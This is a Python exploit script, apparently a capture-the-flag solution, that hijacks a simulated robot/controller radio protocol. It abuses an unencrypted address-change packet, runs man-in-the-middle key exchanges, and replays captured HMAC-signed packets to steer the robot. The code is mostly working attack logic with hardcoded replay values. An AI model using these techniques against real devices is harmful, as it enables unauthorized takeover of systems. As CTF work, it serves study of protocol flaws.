#created by Mel

#apologies for the convoluted code, it gets spaghetti at times
#basically, the vulnerability is:
#   1. all packets are encrypted, EXCEPT for the "change address" one
#   2. by changing the address of the controller, they dont
#       automatically communicate with the robot
#       (the robot uses the old one)
#       thus, we're able to control the conversation!
#   3. we establish connections on both the controller and robot
#   4. actual packets are secured by an HMAC key we don't know,
#          but we can get the controller/robot to sign messages for us

#the technique for doing this:
#   since the only non-deterministic thing about packets is the DH encryption,
#       we can do a replay attack to bypass the HMAC protection
#   the decrypted packets are the same, thus, the HMACs are the same always!

#we then simulate interactions like normal.
#   did the robot controller's current suggested direction match ours?
#       if so, forward it and the robot will move
#       if they didn't, drop the packet.

#to bypass the nonces, this is where the replay attack comes into play.
#   when the robot gets a direction that's just a nullstring,
#       the nonce will increment but nothing will actually happen
#       this is useful since the controller THINKS their packets were read,
#           so it will always increment its nonce in accordance.
#       however, since the server didn't get anything, it's still waiting.
#           thus, it won't increment the nonce since it didn't think anything was yet
 
#i then gathered all the hmacs for the "get_movement" packet
#   these would be forwarded to the controller, since again,
#       if the robot didn't get the direction, it doesn't think anything was actually sent.
#these would be forwarded to the controller to simulate the server actually responding

#TLDR:
#   MiTM and a replay attack was the exploit here.

import requests
import monocypher
from os import urandom
from crypto import * #crypto utilities
from time import sleep
from json import loads
SERVER_URL = input("Site: ").strip()

robot_controller_addr = 0x69
robot_addr = 0x20

# Returns a list of messages seen on the air since the last time this function
# was called
received_msgs = []
def receive_msg(msg_type):
    global received_msgs
    while True:
        #insert only non-debug info
        #print the debug info out
        for v in requests.get(SERVER_URL+"/radio_rx").json():
            if v["msg_type"] == "debug":
                print(f"{v['message']} ({'robot' if v['src'] == robot_addr else 'controller'})")
            else:
                received_msgs.append(v)

        #return the message type that matches what we're looking for
        for i,v in enumerate(received_msgs):
            if v["msg_type"] == msg_type:
                received_msgs.pop(i)
                return v

# [message] argument should be a Python dict object
def inject_radio_message(message):
    requests.post(SERVER_URL+"/radio_tx", json=message)

#robot is address 32
#controller is address 16

#perform set_addr so the radio controller no longer responds automatically
inject_radio_message({
    "msg_type": "set_addr",
    "src": robot_addr,
    "dst": 0x10,
    "new_addr": robot_controller_addr
})

#start the robot
requests.get(SERVER_URL+"/start")

#since the radio controller has the auth key,
#   just forward this request to the controller to do the challenge.
#everything else will be done by us once the auth check passed
inject_radio_message({
    "msg_type": "validate",
    "src": 0x92,
    "dst": robot_controller_addr,
    "challenge": receive_msg("validate")["challenge"]
})

#forward the signed radio message
msg = receive_msg("ack_validate")
inject_radio_message({
    "msg_type": "ack_validate",
    "src": robot_controller_addr,
    "dst": robot_addr,
    "response": msg["response"]
})

#make a private key
priv = os.urandom(32)

#perform a key exchange on the robot
msg = receive_msg("key_exchange")
inject_radio_message({
    "msg_type": "ack_key_exchange",
    "src": 0x0,
    "dst": robot_addr,
    "key": monocypher.compute_key_exchange_public_key(priv).hex()
})
robot_key = monocypher.key_exchange(priv, bytes.fromhex(msg["key"]))

#perform a key exchange on the controller
inject_radio_message({
    "msg_type": "key_exchange",
    "src": 0x0,
    "dst": robot_controller_addr,
    "key": monocypher.compute_key_exchange_public_key(priv).hex()
})
msg = receive_msg("ack_key_exchange") #response from the controller
controller_key = monocypher.key_exchange(priv, bytes.fromhex(msg["key"]))

#print out the keys
print(f"Robot Key: {robot_key.hex()[:10]}...")
print(f"Controller Key: {controller_key.hex()[:10]}...")

#only thing left is hmac's are signed by an unknown key
#and because of nonces, forging an hmac is going to be trickier

#forward an encrypted packet
def forward_pkt(msg_type, dst, pkt):
    #determine the to and from keys
    if dst == robot_controller_addr:
        from_key = robot_key
        to_key = controller_key
    else:
        from_key = controller_key
        to_key = robot_key

    #determine the message
    msg = decrypt(pkt["encrypted"], from_key).decode("utf8")
    msg = encrypt(msg, to_key)

    #inject the message
    inject_radio_message({
        "msg_type": msg_type,
        "src": 0x0,
        "dst": dst,
        "encrypted": msg
    })

#intercepts we can use in the replay attack
#key is the nonce
intercepts = {
    0: '{"message": "get_movement", "nonce": 0, "hmac": "c548d5ccb677a0d5dbacdb17e78b8eb662ec3b0632149e1c95ed5e9523f014c287af15d86534b290d9a3c635189f065b1a7c656b97f7850c570b8f343159b617"}',
    2: '{"message": "get_movement", "nonce": 2, "hmac": "92abf0553d414f0accefcab4fbde5e97a08cc2061da280da1420540abbde302f5ac51ce5143ce4cd2c46166f0fa231ca738a422d2bc3538f4aabeab92046fd6e"}',
    4: '{"message": "get_movement", "nonce": 4, "hmac": "49b145ec80f133cd54dc4a90fb7c2169d982d30d04834644779d7fd4ef45f1e8bd8da822af5a4b68f31e16dfd864605f078893de5b77223732afda637e691bb9"}',
    6: '{"message": "get_movement", "nonce": 6, "hmac": "02e4e15cb6c4eed92cc0aa064e995e074f7cffc108f2a2d9ea22186c84357afaeece46da541f82b03bee42ad601bc15a5ef7c78c7cbb2d34b9ed0d996e62bea2"}',
    8: '{"message": "get_movement", "nonce": 8, "hmac": "a67059573d928d54db2180aaff28812d7767482eb6c8cc3610938de965acef4c5931980d1a486fb1f085a4f108652a7c1bd9cda6c07069f04215310508b05a6f"}',
    10: '{"message": "get_movement", "nonce": 10, "hmac": "84253ed9a0439eb0376a17c91f8c37f17969e3cad4a580bf91b3a77a935cf7a61cb781a2d5a8374ac1366cd6dd0fff747147f8f10becb8444debe75c40067aeb"}',
    12: '{"message": "get_movement", "nonce": 12, "hmac": "a7befe8957a1b1d7ba44528d2974e31a164d9c7bb9b1179384451436e274379d16f79544368de8bb9a5a6d3cf77b36d777b240d0063168d38db8640e39181b34"}',
    14: '{"message": "get_movement", "nonce": 14, "hmac": "b3f5af381a9165b6e293a563b88bb14c8c03fa2a95e311e38226159210fecd853bb5b0b14b63fcf88fd7e5234c9df024b4cc2595075b2fbbe79abf5ae5cf3a30"}',
    16: '{"message": "get_movement", "nonce": 16, "hmac": "6c058807b69f8d5bf7c5e8f833e5719cfe4e9a4943492e2b4c77a746f718be6a93f74a67fa9b1234eed0d67c2ae79255f0d81b46b0402e11fd011a301c0c19c3"}',
    18: '{"message": "get_movement", "nonce": 18, "hmac": "d7edcee3c6eef77d3d340aa8a65aecfca7a81cb8c89e5ce498fc142bb9c7db959912440776d6ea064344e19c22819cef2cf36a30346008ca811b860b18294aea"}',
    20: '{"message": "get_movement", "nonce": 20, "hmac": "48af17acdf5d4ea82d540562351bf2fbd631d8dd94a3e8318d4e1c46e80e4222c51f96ebd8d1906932146327e1f12a36765ffcab4aeb604749da368ce95df7d0"}',
    22: '{"message": "get_movement", "nonce": 22, "hmac": "728a8222d50ceb83e0e6530ffbfb62d6c0acc949380441b87957db06cee4f5165a01e77558adfd2224fb485e841389f6f1e5f31211c69faefb38f3ffa5eff575"}',
    24: '{"message": "get_movement", "nonce": 24, "hmac": "af6935d230cca61062b4b204da8bfb9b3f61ce86fbbc54fb41be8f1acb611cf0ac8e65e9ccdfcafdfb23a1689d38272de4a79c4076f9e7854b067d915a802179"}',
    26: '{"message": "get_movement", "nonce": 26, "hmac": "0dcba21062c897961d6b6f77dbb482b8b81ae0007d639ca51c427f07c32b8b6e8b3abb115dc46b61983c357dc67846a1f8fa2c04ae0230c3a04c414d83be77dc"}',
    28: '{"message": "get_movement", "nonce": 28, "hmac": "677839cff2700de527af8b34f3379f63c90f70b7295e3f46618f07d36d8b7cde45180a5fc26bc0ab4ed5bbbdfa5a83db51fd4430ca76abce96d78e4dff210137"}',
    30: '{"message": "get_movement", "nonce": 30, "hmac": "91cf5f2f10b0b2031f3d864d6291002b5beb0b05858f8725896c084bd0b976cf35fe8ac50e9865f66bdec38092c7eecb7c31d5b725891ecf6c7afc61f9923815"}',
    32: '{"message": "get_movement", "nonce": 32, "hmac": "78bebc94ac4dbc71f8c77c9a40f6f5feb0dcaf10cc9306ce22af4e4fa13196d6a9c21d6ec61a6b254b158220e7c48a67ecbd780ed082c26d4f1088506396bbea"}',
    34: '{"message": "get_movement", "nonce": 34, "hmac": "11a1a585c02d8ececad11f1e14da6407107e07e4c20bfb6d36c1b685524589cc88811a97a057dc1433ab648125c77aff4f235ff4f46c51a3ef6f6ae94062c93d"}',
    36: '{"message": "get_movement", "nonce": 36, "hmac": "cca6cc4164071d8ac344b4bad3437f409a5b29fc1078f977e5ee635b3412e4151b1e1f684cd2330644d8ce0f9d8de989829585452d728c5774ce69add9c1f100"}',
    38: '{"message": "get_movement", "nonce": 38, "hmac": "23d77fbbfb9050bc8a0732a3d785f28a2834926659f7d4c7cc66568ebbbe473b1ab0a292b5f21410b96f098708caf827341e699f7dd7a815e8d89ba4d88062c9"}'
}

#our goal is to continuously send "get_movement"
#and then, when the controller's output buffer aligns with what we want,
#we forward that portion of data
movement_ctr = 0
arr = ["E","S","W","N"]
course = ["E", "S", "E", "N", "W", "S", "E", "N", "E", "S"]
success = True
controller_nonce = 0
while True:
    print(f"{(len(intercepts)*2-controller_nonce)} intercepts left")
    direc = course.pop(0)

    controller_nonce_from_msg = lambda msg: loads(decrypt(msg["encrypted"], controller_key).decode("utf8"))["nonce"]
    robot_nonce_from_msg = lambda msg: loads(decrypt(msg["encrypted"], robot_key).decode("utf8"))["nonce"]
    while True:
        #send the secure_data intercept
        if controller_nonce < 40:
            inject_radio_message({
                "msg_type": "secure_data",
                "src": 0x0,
                "dst": robot_controller_addr,
                "encrypted": encrypt(intercepts[controller_nonce], controller_key)
            })
        else:
            #i wasn't able to intercept the last 2
            #but since these are as expected in the pattern E/S/W/N
            #we can just continue the connections like nothing happened
            #so, we'll use the secure data taken from the robot itself
            secure_data = receive_msg("secure_data")
            while robot_nonce_from_msg(secure_data) != controller_nonce:
                secure_data = receive_msg("secure_data")
                current_nonce = robot_nonce_from_msg(secure_data)

            #proxy it
            forward_pkt("secure_data", robot_controller_addr, secure_data)

        #save the acknowledgement packet
        ack = receive_msg("secure_data_ack")
        controller_nonce = controller_nonce_from_msg(ack)+1

        #if we were successful in moving the robot,
        #   the robot will send another secure_data
        #we're using intercepts and passing them on
        #but we need to send an acknolwedgement packet
        if success:
            success = False
            forward_pkt("secure_data_ack", robot_addr, ack)
        else:
            #if we drop a packet from the controller,
            #   the robot nonce isn't incremented and thus doesn't match.
            #   we do this by just doing a NOP on the secure data request
            req = receive_msg("secure_data_request")
            inject_radio_message({
                "msg_type": "secure_data_response",
                "src": 0x0,
                "dst": robot_addr,
                "encrypted": req["encrypted"]
            })

            #after this, we should be aligned

        #get the robot's direction request packet
        #forward to the controller
        req = receive_msg("secure_data_request")
        if robot_nonce_from_msg(req) != controller_nonce:
            print(f"{robot_nonce_from_msg(req)} != {controller_nonce}")
            exit()
        forward_pkt("secure_data_request", robot_controller_addr, req)

        #get the controller's response
        #this will be the direction the controller is proposing
        resp = receive_msg("secure_data_response")

        #archive the controller nonce again
        controller_nonce = controller_nonce_from_msg(resp)+1

        #increment the movement counter for the next iterations
        movement_ctr += 1

        #when the packet was sent, did the direction match ours?
        #if so, simply forward it and call it a day
        if arr[(movement_ctr-1)%4] == direc:
            forward_pkt("secure_data_response", robot_addr, resp)
            success = True
            break

        #send in blank data to make the robot continue listening
        #we use the request, since the data IS blank
        inject_radio_message({
            "msg_type": "secure_data_response",
            "src": 0x0,
            "dst": robot_addr,
            "encrypted": req["encrypted"]
        })

        #the robot is in receive mode still
        #i gathered some hashes to use for replay attacks
        #we send those interceptions, encrypted with the controller key